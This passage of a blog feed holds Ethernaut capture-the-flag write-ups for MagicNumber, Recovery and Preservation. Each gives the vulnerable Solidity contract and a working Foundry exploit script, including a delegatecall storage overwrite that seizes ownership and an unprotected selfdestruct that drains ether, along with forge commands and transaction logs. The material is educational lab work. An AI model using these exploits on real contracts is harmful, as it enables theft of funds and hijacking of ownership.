highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"err\">0</span><span class=\"nf\">x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a</span> </code></pre></div></div><p>when <code class=\"language-plaintext highlighter-rouge\">whatIsTheMeaningOfLife()</code> function is called.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/MagicNumber.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"k\">assembly</span> <span class=\"p\">{</span>            <span class=\"n\">mstore</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mh\">0x602a60005260206000f3</span><span class=\"p\">)</span>            <span class=\"k\">return</span><span class=\"p\">(</span><span class=\"mh\">0x16</span><span class=\"p\">,</span> <span class=\"mh\">0x0a</span><span class=\"p\">)</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">MagicNumberSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">MagicNum</span> <span class=\"k\">public</span> <span class=\"n\">mn_</span> <span class=\"o\">=</span> <span class=\"n\">MagicNum</span><span class=\"p\">(</span><span class=\"mh\">0x20416BDe7653DaC534a51C744D7f572Bfd22aC76</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before solver: \"</span><span class=\"p\">,</span> <span class=\"n\">mn_</span><span class=\"p\">.</span><span class=\"n\">solver</span><span class=\"p\">());</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">mn_</span><span class=\"p\">.</span><span class=\"n\">setSolver</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">ex</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After solver: \"</span><span class=\"p\">,</span> <span class=\"n\">mn_</span><span class=\"p\">.</span><span class=\"n\">solver</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>When the command <code class=\"language-plaintext highlighter-rouge\">mstore(0, 0x602a60005260206000f3)</code> is executed, the memory state becomes:</p><div class=\"language-nasm highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"err\">0</span><span class=\"nf\">x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000602a60005260206000f3</span></code></pre></div></div><p>After that, <code class=\"language-plaintext highlighter-rouge\">return(0x16, 0x0a)</code> is executed, returning only the last 10 bytes (the constructor code), which is:</p><div class=\"language-nasm highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"err\">0</span><span class=\"nf\">x602a60005260206000f3</span></code></pre></div></div>",
            "url": "https://0o3q.github.io/2025/05/18/magicnumber",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","assembly","bytecode"],
            
            "date_published": "2025-05-18T00:00:00+09:00",
            "date_modified": "2025-05-18T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/05/17/recovery",
            "title": "[Ethernaut] 17.Recovery",
            "summary": null,
            "content_text": "AnalysisThe goal is  recover (or remove) the¬†0.001¬†ether from the lost contract address.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Recovery {    //generate tokens    function generateToken(string memory _name, uint256 _initialSupply) public {        new SimpleToken(_name, msg.sender, _initialSupply);    }}contract SimpleToken {    string public name;    mapping(address =&gt; uint256) public balances;    // constructor    constructor(string memory _name, address _creator, uint256 _initialSupply) {        name = _name;        balances[_creator] = _initialSupply;    }    // collect ether in return for tokens    receive() external payable {        balances[msg.sender] = msg.value * 10;    }    // allow transfers of tokens    function transfer(address _to, uint256 _amount) public {        require(balances[msg.sender] &gt;= _amount);        balances[msg.sender] = balances[msg.sender] - _amount;        balances[_to] = _amount;    }    // clean up after ourselves    function destroy(address payable _to) public {        selfdestruct(_to);    }}First, we identify the lost contract address.We search the blockchain explorer using the given instance address: 0x8A53163e6d7423D3F83E871f6E16FF855D3B73FE.My challenge is deployed at 0x7585bEb16C9dCFb8E71bF433d0E924f70Ca3efD4.From the on-chain trace, we observe that the 0x7585 contract deployed or interacted with the 0x8a53 contract and called the generateToken() function.Subsequently, 0x8a53 interacted with another contract, 0xc413.We suspect 0xc413 is the lost contract.When inspecting the transaction involving 0xc413, we can see that 0x7585 sent exactly 0.001 Ether to 0xc413.Based on the challenge hint ‚Äî ‚Äúcreator sent 0.001 ether to obtain more tokens‚Äù ‚Äî we can conclude that 0xc413 is the lost contract we are looking for.Exploit// SPDX-License-Identifier: MIT// forge script script/RecoverySol.sol:RecoverySol --account mingw --sender 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 --rpc-url kairos --broadcastpragma solidity ^0.8.0;import \"../src/Recovery.sol\";import \"forge-std/Script.sol\";contract RecoverySol is Script {    SimpleToken public st_ = SimpleToken(payable(0xC41399Fe813068a3A23DE4215C43584AA3A188A0));    function run() external {        vm.startBroadcast();        console.log(\"Before balance\", address(st_).balance);        st_.destroy(payable(msg.sender));        console.log(\"After balance\", address(st_).balance);        vm.stopBroadcast();    }}",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>recover (or remove) the¬†<code class=\"language-plaintext highlighter-rouge\">0.001</code>¬†ether from the lost contract address.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Recovery</span> <span class=\"p\">{</span>    <span class=\"c1\">//generate tokens</span>    <span class=\"k\">function</span> <span class=\"n\">generateToken</span><span class=\"p\">(</span><span class=\"kt\">string</span> <span class=\"k\">memory</span> <span class=\"n\">_name</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">_initialSupply</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"k\">new</span> <span class=\"n\">SimpleToken</span><span class=\"p\">(</span><span class=\"n\">_name</span><span class=\"p\">,</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">_initialSupply</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">SimpleToken</span> <span class=\"p\">{</span>    <span class=\"kt\">string</span> <span class=\"k\">public</span> <span class=\"n\">name</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">balances</span><span class=\"p\">;</span>    <span class=\"c1\">// constructor</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">string</span> <span class=\"k\">memory</span> <span class=\"n\">_name</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_creator</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">_initialSupply</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">name</span> <span class=\"o\">=</span> <span class=\"n\">_name</span><span class=\"p\">;</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_creator</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">_initialSupply</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"c1\">// collect ether in return for tokens</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">*</span> <span class=\"mi\">10</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"c1\">// allow transfers of tokens</span>    <span class=\"k\">function</span> <span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">_amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;=</span> <span class=\"n\">_amount</span><span class=\"p\">);</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-</span> <span class=\"n\">_amount</span><span class=\"p\">;</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_to</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">_amount</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"c1\">// clean up after ourselves</span>    <span class=\"k\">function</span> <span class=\"n\">destroy</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"n\">_to</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">selfdestruct</span><span class=\"p\">(</span><span class=\"n\">_to</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>First, we identify the lost contract address.</p><p>We search the blockchain explorer using the given instance address: <code class=\"language-plaintext highlighter-rouge\">0x8A53163e6d7423D3F83E871f6E16FF855D3B73FE</code>.</p><p><img src=\"https://0o3q.github.io/images/2025-05-17-Recovery/blockchainExplorer.png\" alt=\"image.png\" /></p><p>My challenge is deployed at <code class=\"language-plaintext highlighter-rouge\">0x7585bEb16C9dCFb8E71bF433d0E924f70Ca3efD4</code>.</p><p>From the on-chain trace, we observe that the <code class=\"language-plaintext highlighter-rouge\">0x7585</code> contract deployed or interacted with the <code class=\"language-plaintext highlighter-rouge\">0x8a53</code> contract and called the <code class=\"language-plaintext highlighter-rouge\">generateToken()</code> function.</p><p>Subsequently, <code class=\"language-plaintext highlighter-rouge\">0x8a53</code> interacted with another contract, <code class=\"language-plaintext highlighter-rouge\">0xc413</code>.</p><p>We suspect <code class=\"language-plaintext highlighter-rouge\">0xc413</code> is the lost contract.</p><p><img src=\"https://0o3q.github.io/images/2025-05-17-Recovery/blockchainExplorer2.png\" alt=\"image.png\" /></p><p>When inspecting the transaction involving <code class=\"language-plaintext highlighter-rouge\">0xc413</code>, we can see that <code class=\"language-plaintext highlighter-rouge\">0x7585</code> sent exactly 0.001 Ether to <code class=\"language-plaintext highlighter-rouge\">0xc413</code>.</p><p>Based on the challenge hint ‚Äî ‚Äúcreator sent 0.001 ether to obtain more tokens‚Äù ‚Äî we can conclude that <code class=\"language-plaintext highlighter-rouge\">0xc413</code> is the lost contract we are looking for.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT// forge script script/RecoverySol.sol:RecoverySol --account mingw --sender 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 --rpc-url kairos --broadcast</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Recovery.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">RecoverySol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">SimpleToken</span> <span class=\"k\">public</span> <span class=\"n\">st_</span> <span class=\"o\">=</span> <span class=\"n\">SimpleToken</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0xC41399Fe813068a3A23DE4215C43584AA3A188A0</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before balance\"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">st_</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>        <span class=\"n\">st_</span><span class=\"p\">.</span><span class=\"n\">destroy</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After balance\"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">st_</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-05-17-Recovery/result.png\" alt=\"image.png\" /></p>",
            "url": "https://0o3q.github.io/2025/05/17/recovery",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","Explorer"],
            
            "date_published": "2025-05-17T00:00:00+09:00",
            "date_modified": "2025-05-17T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/05/15/preservation",
            "title": "[Ethernaut] 16.Preservation",
            "summary": null,
            "content_text": "AnalysisThe goal is  claim ownership// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Preservation {    // public library contracts    address public timeZone1Library;    address public timeZone2Library;    address public owner;    uint256 storedTime;    // Sets the function signature for delegatecall    bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {        timeZone1Library = _timeZone1LibraryAddress;        timeZone2Library = _timeZone2LibraryAddress;        owner = msg.sender;    }    // set the time for timezone 1    function setFirstTime(uint256 _timeStamp) public {        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));    }    // set the time for timezone 2    function setSecondTime(uint256 _timeStamp) public {        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));    }}// Simple library contract to set the timecontract LibraryContract {    // stores a timestamp    uint256 storedTime;    function setTime(uint256 _time) public {        storedTime = _time;    }}In the Preservation contract, the setFirstTime() and setSecondTime() functions use delegatecall to update the storedTime.As demonstrated in the Delegation challenge, delegatecall allows a called contract to modify the storage of the calling contract.As can be inferred from the hint, storage is accessed by slot number rather than by variable name when using delegatecall.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Preservation.sol\";import \"forge-std/Script.sol\";contract Ex {    address public AAAA;    address public BBBB;    address public owner;    function setTime(uint256 _owner) public {        owner = address(uint160(_owner));    }}contract PreservationSol is Script {    Preservation public pv_ = Preservation(0xD7cfE396981D91a4a11CB7261739F32F36cb9017);    function run() external {        vm.startBroadcast();        Ex ex = new Ex();        console.log(\"Before owner: \", pv_.owner());        console.log(\"Before timeZone1Library address: \", pv_.timeZone1Library());        pv_.setFirstTime(uint256(uint160(address(ex))));        console.log(\"First set: \", pv_.timeZone1Library());        pv_.setFirstTime(uint256(uint160(msg.sender)));        console.log(\"After owner: \", pv_.owner());        vm.stopBroadcast();    }}We can first overwrite the timeZone1Library variable with the address of a malicious contract, and then use it to overwrite the owner variable.$ forge script script/PreservationSol.sol:PreservationSol --account mingw --sender 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 --rpc-url kairos --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Before owner:  0x7B587eD6A41030bEFD2FE6437a895D22260F7132  Before timeZone1Library address:  0xf24b27D4D691d05b59fb441d4df8374480D5E9Ac  After timeZone1Library address:  0x21dA2776E60d5FAB93773eE66b547c54038350C4  After timeZone1Library address:  0x21dA2776E60d5FAB93773eE66b547c54038350C4  After owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 1001Estimated gas price: 52.5 gweiEstimated total gas used for script: 327554Estimated amount required: 0.017196585 ETH==========================Enter keystore password:##### 1001‚úÖ  [Success] Hash: 0xbe01e24783ab42cd7662f2f25ed08617ff5d23ab1cf049118da11b30657d30e6Contract Address: 0x21dA2776E60d5FAB93773eE66b547c54038350C4Block: 185739056Paid: 0.0065975525 ETH (239911 gas * 27.5 gwei)##### 1001‚úÖ  [Success] Hash: 0x4d6913ae6d8cb717ff25cd1d5fd1bb3f836b1678b435e445b030ec1f8c4f4fe4Block: 185739056Paid: 0.000976855 ETH (35522 gas * 27.5 gwei)##### 1001‚úÖ  [Success] Hash: 0x4442bf1e8285f7fbf1b46c906cfc03367926bdd3ac633b8c7fe653c8e2c63481Block: 185739056Paid: 0.0009108 ETH (33120 gas * 27.5 gwei)‚úÖ Sequence #1 on 1001 | Total Paid: 0.0084852075 ETH (308553 gas * avg 27.5 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>claim ownership</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Preservation</span> <span class=\"p\">{</span>    <span class=\"c1\">// public library contracts</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">timeZone1Library</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">timeZone2Library</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"n\">storedTime</span><span class=\"p\">;</span>    <span class=\"c1\">// Sets the function signature for delegatecall</span>    <span class=\"kt\">bytes4</span> <span class=\"k\">constant</span> <span class=\"n\">setTimeSignature</span> <span class=\"o\">=</span> <span class=\"kt\">bytes4</span><span class=\"p\">(</span><span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"s\">\"setTime(uint256)\"</span><span class=\"p\">));</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_timeZone1LibraryAddress</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_timeZone2LibraryAddress</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">timeZone1Library</span> <span class=\"o\">=</span> <span class=\"n\">_timeZone1LibraryAddress</span><span class=\"p\">;</span>        <span class=\"n\">timeZone2Library</span> <span class=\"o\">=</span> <span class=\"n\">_timeZone2LibraryAddress</span><span class=\"p\">;</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"c1\">// set the time for timezone 1</span>    <span class=\"k\">function</span> <span class=\"n\">setFirstTime</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_timeStamp</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">timeZone1Library</span><span class=\"p\">.</span><span class=\"nb\">delegatecall</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodePacked</span><span class=\"p\">(</span><span class=\"n\">setTimeSignature</span><span class=\"p\">,</span> <span class=\"n\">_timeStamp</span><span class=\"p\">));</span>    <span class=\"p\">}</span>    <span class=\"c1\">// set the time for timezone 2</span>    <span class=\"k\">function</span> <span class=\"n\">setSecondTime</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_timeStamp</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">timeZone2Library</span><span class=\"p\">.</span><span class=\"nb\">delegatecall</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodePacked</span><span class=\"p\">(</span><span class=\"n\">setTimeSignature</span><span class=\"p\">,</span> <span class=\"n\">_timeStamp</span><span class=\"p\">));</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"c1\">// Simple library contract to set the time</span><span class=\"k\">contract</span> <span class=\"n\">LibraryContract</span> <span class=\"p\">{</span>    <span class=\"c1\">// stores a timestamp</span>    <span class=\"kt\">uint256</span> <span class=\"n\">storedTime</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">setTime</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_time</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">storedTime</span> <span class=\"o\">=</span> <span class=\"n\">_time</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>In the Preservation contract, the <code class=\"language-plaintext highlighter-rouge\">setFirstTime()</code> and <code class=\"language-plaintext highlighter-rouge\">setSecondTime()</code> functions use delegatecall to update the <code class=\"language-plaintext highlighter-rouge\">storedTime</code>.</p><p>As demonstrated in the <a href=\"https://0o3q.github.io/2025/04/19/delegation\">Delegation</a> challenge, <code class=\"language-plaintext highlighter-rouge\">delegatecall</code> allows a called contract to modify the storage of the calling contract.</p><p>As can be inferred from the hint, storage is accessed by slot number rather than by variable name when using <code class=\"language-plaintext highlighter-rouge\">delegatecall</code>.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Preservation.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">AAAA</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">BBBB</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">setTime</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_owner</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">_owner</span><span class=\"p\">));</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">PreservationSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Preservation</span> <span class=\"k\">public</span> <span class=\"n\">pv_</span> <span class=\"o\">=</span> <span class=\"n\">Preservation</span><span class=\"p\">(</span><span class=\"mh\">0xD7cfE396981D91a4a11CB7261739F32F36cb9017</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before owner: \"</span><span class=\"p\">,</span> <span class=\"n\">pv_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before timeZone1Library address: \"</span><span class=\"p\">,</span> <span class=\"n\">pv_</span><span class=\"p\">.</span><span class=\"n\">timeZone1Library</span><span class=\"p\">());</span>        <span class=\"n\">pv_</span><span class=\"p\">.</span><span class=\"n\">setFirstTime</span><span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">ex</span><span class=\"p\">))));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"First set: \"</span><span class=\"p\">,</span> <span class=\"n\">pv_</span><span class=\"p\">.</span><span class=\"n\">timeZone1Library</span><span class=\"p\">());</span>        <span class=\"n\">pv_</span><span class=\"p\">.</span><span class=\"n\">setFirstTime</span><span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">)));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After owner: \"</span><span class=\"p\">,</span> <span class=\"n\">pv_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>We can first overwrite the <code class=\"language-plaintext highlighter-rouge\">timeZone1Library</code> variable with the address of a malicious contract, and then use it to overwrite the <code class=\"language-plaintext highlighter-rouge\">owner</code> variable.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/PreservationSol.sol:PreservationSol <span class=\"nt\">--account</span> mingw <span class=\"nt\">--sender</span> 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 <span class=\"nt\">--rpc-url</span> kairos <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Before owner:  0x7B587eD6A41030bEFD2FE6437a895D22260F7132  Before timeZone1Library address:  0xf24b27D4D691d05b59fb441d4df8374480D5E9Ac  After timeZone1Library address:  0x21dA2776E60d5FAB93773eE66b547c54038350C4  After timeZone1Library address:  0x21dA2776E60d5FAB93773eE66b547c54038350C4  After owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 1001Estimated gas price: 52.5 